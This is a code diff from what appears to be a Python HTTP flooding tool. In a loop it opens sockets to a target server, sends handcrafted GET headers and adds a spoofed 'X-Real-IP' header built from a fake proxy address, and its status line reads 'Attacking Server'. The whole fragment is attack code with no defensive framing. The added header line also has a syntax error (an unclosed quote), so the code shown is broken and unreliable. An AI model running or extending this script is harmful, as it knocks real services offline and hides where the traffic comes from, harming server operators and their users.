@@ -50,10 +50,11 @@ try:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((ip,port))
-            s.sendto(("GET / " + ip + " HTTP/1.1\r\n\r\n").encode('ascii'), (ip,port))
-            s.sendto(("Host: " + fip + "\r\n\r\n").encode('ascii'), (ip,port))
+            s.sendto(("GET / HTTP/1.1\r\n\r\n").encode('ascii'), (ip,port))
+            s.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (ip,port))
             s.sendto(("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'").encode('ascii'), (ip,port))
             s.sendto(("Connection: keep-alive\r\n\r\n").encode('ascii'), (ip,port))
+            s.sendto(("X-Real-IP: "+fip+"\r\n").encode('ascii), (ip,port))
             s.close()
             print(f"Attacking Server | {ip}:{port} Sent : ", i, f" With Proxy : {fip}", end='\r')
         except TimeoutError:
